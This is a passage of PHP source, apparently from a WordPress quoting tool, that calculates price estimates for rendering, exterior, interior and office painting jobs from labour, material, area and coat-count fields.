									$range_price_total = $temp['range_price'];
									$levels_total = $levels_total + $range_price_total;
							}

					}
			}


				
			$inside_total = $carpet_total + $general_clean_total + $extras_total;
					  $ouside_total = $pressure_total + $levels_total;
			$cleaning_total = $inside_total + $outside_total;
			$total = $total + $cleaning_total;

	}

   // V2 formulas for Painting Exterior template
  if(get_the_title($t) == 'Rendering') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $height = $data['area_height'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
							      		if($d['slug'] == 'type') {
                                                $type_title = $d['title'];
                                                $type_prices = $d['type_of_price'];
                                                $type_data = $d['fields'];
                                        }
                        if($d['slug'] == 'joinerys') {
                                $windows_and_doors_title = $d['title'];
                                $windows_and_doors_prices = $d['type_of_price'];
                                $windows_and_doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'coating') {
                                $coats_title = $d['title'];
                                $coats_prices = $d['coats_of_price'];
                                $coats_data = $d['fields'];
                        } 
                        if($d['slug'] == 'trim') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_title = $d['title'];
                                $paint_prices = $d['type_of_price'];
                                $paint_data = $d['fields'];
                        }

                }


                $wall_area = $width * $height;
                $outer_length = $width;

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ($range_price_total * $wall_area);
                                }

                        }
                }

                $type = $data['type'];
                $type_total = 0;
                foreach($type_data as $temp) {
                        if( $temp['title'] == $type ) {

                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ($range_price_total * $wall_area);
                                }

                        }
                }

                $paint = $data['paint'];
                $paint_details_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                if($paint_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$paint_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $paint_details_total = $labour_and_material_total;
                                }
                                elseif($paint_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $paint_details_total = $range_price_total;
                                }

                        }
                }

					
                $windows_and_doors = $data['joinerys'];
                $windows_and_doors_total = 0;
                foreach($windows_and_doors_data as $temp) {
                        if( in_array($temp['title'],$windows_and_doors) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_and_doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_and_doors_total = $windows_and_doors_total + ( $labour_and_material_total * $extra_count);
                                }
                                elseif($windows_and_doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_and_doors_total = $windows_and_doors_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( ($temp['title'] == $trim) || in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + ($labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ($range_price_total * $outer_length);
                                }

                        }
                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

     
                $exterior_total = $current_total + $type_total + $windows_and_doors_total + $trim_total;
                $bring_paint = $exterior_total * $paint_details_total / 100;
                $painting_exterior_total = $exterior_total + $bring_paint;
    
                $paint_full = $painting_exterior_total + $extras_total;

                $total = $total + $paint_full;

        }

   // V2 formulas for Painting Exterior template
  if(get_the_title($t) == 'Exterior Painting') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $height = $data['area_height'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'current') {
                                $current_title = $d['title'];
                                $current_prices = $d['type_of_price'];
                                $current_data = $d['fields'];
                        }
							      		if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                        if($d['slug'] == 'joinerys') {
                                $windows_and_doors_title = $d['title'];
                                $windows_and_doors_prices = $d['type_of_price'];
                                $windows_and_doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'coating') {
                                $coats_title = $d['title'];
                                $coats_prices = $d['coats_of_price'];
                                $coats_data = $d['fields'];
                        } 
                        if($d['slug'] == 'trim') {
                                $trim_title = $d['title'];
                                $trim_prices = $d['type_of_price'];
                                $trim_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extras_title = $d['title'];
                                $extras_prices = $d['type_of_price'];
                                $extras_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $paint_title = $d['title'];
                                $paint_prices = $d['type_of_price'];
                                $paint_data = $d['fields'];
                        }

                }


                $wall_area = $width * $height;
                $outer_length = $width;

                $current = $data['current'];
                $current_total = 0;
                foreach($current_data as $temp) {
                        if( $temp['title'] == $current ) {

                                if($current_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total + ($labour_and_material_total * $wall_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ($range_price_total * $wall_area);
                                }

                        }
                }

                $paint = $data['paint'];
                $paint_details_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                if($paint_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$paint_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $paint_details_total = $labour_and_material_total;
                                }
                                elseif($paint_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $paint_details_total = $range_price_total;
                                }

                        }
                }

					
                $coating = $data['coating'];
                $coats_total = 1;
                foreach($coats_data as $temp) {
                    if($temp['title'] == $coating) {

                        // let's count QNT of each coating field
                        $field_title = $temp['title'];
                        $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                        $count_field_title = strtolower($count_field_title);
                        $coats_count = $data['' . $count_field_title . ''];
                        if($coats_count == NULL || $coats_count == '' || empty($coats_count)) {
                             $coats_count = .6;
                        }
                        if($coats_count == 1) {$coats_count = .6;}
                        elseif($coats_count == 2) {$coats_count = 1;}
                        elseif($coats_count == 3) {$coats_count = 1.3;}
                        elseif($coats_count == 4) {$coats_count = 1.6;}
                        elseif($coats_count == 5) {$coats_count = 1.9;}
                        elseif($coats_count == 6) {$coats_count = 2.2;}
                        elseif($coats_count == 7) {$coats_count = 2.5;}

                        $coats_total = $coats_total * $coats_count;
                    }

                }

					     
                $windows_and_doors = $data['joinerys'];
                $windows_and_doors_total = 0;
                foreach($windows_and_doors_data as $temp) {
                        if( in_array($temp['title'],$windows_and_doors) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($windows_and_doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $windows_and_doors_total = $windows_and_doors_total + ( $labour_and_material_total * $extra_count);
                                }
                                elseif($windows_and_doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $windows_and_doors_total = $windows_and_doors_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( ($temp['title'] == $trim) || in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + ($labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ($range_price_total * $outer_length);
                                }

                        }
                }


                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

     
                $exterior_total = ($current_total + $windows_and_doors_total + $trim_total) * $coats_total;
                $bring_paint = $exterior_total * $paint_details_total / 100;
                $painting_exterior_total = ($exterior_total + $bring_paint) * $coats_total;
    
                $paint_full = $painting_exterior_total + $extras_total;

                $total = $total + $paint_full;

        }

	// V2
	if(get_the_title($t) == 'Interior Painting') {

			$all_scope_data = get_field('quote_fields',$t);

			$width = $data['area_width'];
			$length = $data['area_length'];

			foreach($all_scope_data as $d) {
					if($d['slug'] == 'ceiling_height') {
							$height_data = $d['fields'];
					}
					if($d['slug'] == 'rooms') {
							$p_rooms_title = $d['title'];
							$p_rooms_prices = $d['type_of_price'];
							$p_rooms_data = $d['fields'];
					}
					if($d['slug'] == 'paint') {
							$paint_supply_title = $d['title'];
							$paint_supply_prices = $d['type_of_price'];
							$paint_supply_data = $d['fields'];
					}
					if($d['slug'] == 'doors') {
							$extras_title = $d['title'];
							$extras_prices = $d['type_of_price'];
							$extras_data = $d['fields'];
					}
					if($d['slug'] == 'extras') {
							$trim_title = $d['title'];
							$trim_prices = $d['type_of_price'];
							$trim_data = $d['fields'];
					}
					if($d['slug'] == 'surface') {
							$surface_title = $d['title'];
							$surface_prices = $d['type_of_price'];
							$surface_data = $d['fields'];
					}
        	if($d['slug'] == 'coating') {
											$coats_title = $d['title'];
											$coats_prices = $d['coats_of_price'];
											$coats_data = $d['fields'];
					}
					if($d['slug'] == 'sealer') {
							$sealer_title = $d['title'];
							$sealer_prices = $d['type_of_price'];
							$sealer_data = $d['fields'];
					}
					if($d['slug'] == 'other') {
							$other_title = $d['title'];
							$other_prices = $d['type_of_price'];
							$other_data = $d['fields'];
					}

			}
				 
			$height = $data['ceiling_height'];
			$height_total = 0;
			foreach($height_data as $temp) {
					if( $temp['title'] == $height ) {

							$range_price_total = $temp['range_price'];
							$height_total = $range_price_total;

					}
			}
	
			$p_rooms = $data['rooms'];
			$p_rooms_total = 0;
			foreach($p_rooms_data as $temp) {
					if( in_array($temp['title'],$p_rooms) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($p_rooms_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$p_rooms_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$p_rooms_total = $p_rooms_total + ($labour_and_material_total * $extra_count);
							}
							elseif($p_rooms_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$p_rooms_total = $p_rooms_total + ($range_price_total * $extra_count);
							}

					}
			}

			$paint_supply = $data['paint'];
			$paint_supply_total = 0;
			foreach($paint_supply_data as $temp) {
					if( $temp['title'] == $paint_supply ) {

							$range_price_total = $temp['range_price'];
							$paint_supply_total = $range_price_total;

					}
			}

					
			$extras = $data['doors'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total + ($labour_and_material_total * $extra_count);
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ($range_price_total * $extra_count);
							}

					}
			}
    
    	$coating = $data['coating'];
			$coats_total = 1;
			foreach($coats_data as $temp) {
					if($temp['title'] == $coating) {

							// let's count QNT of each coating field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$coats_count = $data['' . $count_field_title . ''];
							if($coats_count == NULL || $coats_count == '' || empty($coats_count)) {
								   $coats_count = .6;
							}
              if($coats_count == 1) {$coats_count = .6;}
              elseif($coats_count == 2) {$coats_count = 1;}
              elseif($coats_count == 3) {$coats_count = 1.3;}
              elseif($coats_count == 4) {$coats_count = 1.6;}
              elseif($coats_count == 5) {$coats_count = 1.9;}
              elseif($coats_count == 6) {$coats_count = 2.2;}
              elseif($coats_count == 7) {$coats_count = 2.5;}
            
              $coats_total = $coats_total * $coats_count;
					}
 
			}
		

		  $other = $data['other'];
			$other_total = 0;
			foreach($other_data as $temp) {
					if( in_array($temp['title'],$other) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($other_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$other_total = $other_total + ($labour_and_material_total * $extra_count);
							}
							elseif($other_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$other_total = $other_total + ($range_price_total * $extra_count);
							}

					}
			}
				
			$surface = $data['surface'];
			$surface_total = 0;
			foreach($surface_data as $temp) {
					if( in_array($temp['title'],$surface) ) {

							if($surface_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$surface_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$surface_total = $surface_total + $labour_and_material_total;
							}
							elseif($surface_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$surface_total = $surface_total + $range_price_total;
							}

					}
			}

			$percent_total = $surface_total / 100;
		  $rooms_total = $p_rooms_total * $percent_total;
			$rooms_price_total = $rooms_total + ($rooms_total * $height_total / 100) + $extras_total;
			$paint_interior = $rooms_price_total + ($rooms_price_total * $paint_supply_total / 100);
      $paint_interior_full = $paint_interior * $coats_total;
      $paint_interior_total = $paint_interior_full + $other_total;

			$total = $total + $paint_interior_total;
		
	}

  // V2
	if(get_the_title($t) == 'Office Painting') {

			$all_scope_data = get_field('quote_fields',$t);

			$width = $data['area_width'];
			$length = $data['area_length'];

			foreach($all_scope_data as $d) {
					if($d['slug'] == 'ceiling_height') {
							$height_data = $d['fields'];
					}
					if($d['slug'] == 'rooms') {
							$p_rooms_title = $d['title'];
							$p_rooms_prices = $d['type_of_price'];
							$p_rooms_data = $d['fields'];
					}
					if($d['slug'] == 'paint') {
							$paint_supply_title = $d['title'];
							$paint_supply_prices = $d['type_of_price'];
							$paint_supply_data = $d['fields'];
					}
					if($d['slug'] == 'doors') {
							$extras_title = $d['title'];
							$extras_prices = $d['type_of_price'];
							$extras_data = $d['fields'];
					}
					if($d['slug'] == 'extras') {
							$trim_title = $d['title'];
							$trim_prices = $d['type_of_price'];
							$trim_data = $d['fields'];
					}
			    if($d['slug'] == 'surface') {
							$surface_title = $d['title'];
							$surface_prices = $d['type_of_price'];
							$surface_data = $d['fields'];
					}
									  if($d['slug'] == 'sealer') {
							$sealer_title = $d['title'];
							$sealer_prices = $d['type_of_price'];
							$sealer_data = $d['fields'];
					}
					if($d['slug'] == 'other') {
							$other_title = $d['title'];
							$other_prices = $d['type_of_price'];
							$other_data = $d['fields'];
					}

			}
				 
			$height = $data['ceiling_height'];
			$height_total = 0;
			foreach($height_data as $temp) {
					if( $temp['title'] == $height ) {

							$range_price_total = $temp['range_price'];
							$height_total = $range_price_total;

					}
			}
				
			$sealer = $data['sealer'];
			$sealer_total = 0;
			foreach($sealer_data as $temp) {
					if( $temp['title'] == $sealer ) {

							$range_price_total = $temp['range_price'];
							$sealer_total = $range_price_total;

					}
			}

			$p_rooms = $data['rooms'];
			$p_rooms_total = 0;
			foreach($p_rooms_data as $temp) {
					if( in_array($temp['title'],$p_rooms) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($p_rooms_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$p_rooms_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$p_rooms_total = $p_rooms_total + ($labour_and_material_total * $extra_count);
							}
							elseif($p_rooms_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$p_rooms_total = $p_rooms_total + ($range_price_total * $extra_count);
							}

					}
			}

			$paint_supply = $data['paint'];
			$paint_supply_total = 0;
			foreach($paint_supply_data as $temp) {
					if( $temp['title'] == $paint_supply ) {

							$range_price_total = $temp['range_price'];
							$paint_supply_total = $range_price_total;

					}
			}

					
			$extras = $data['doors'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( in_array($temp['title'],$extras) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

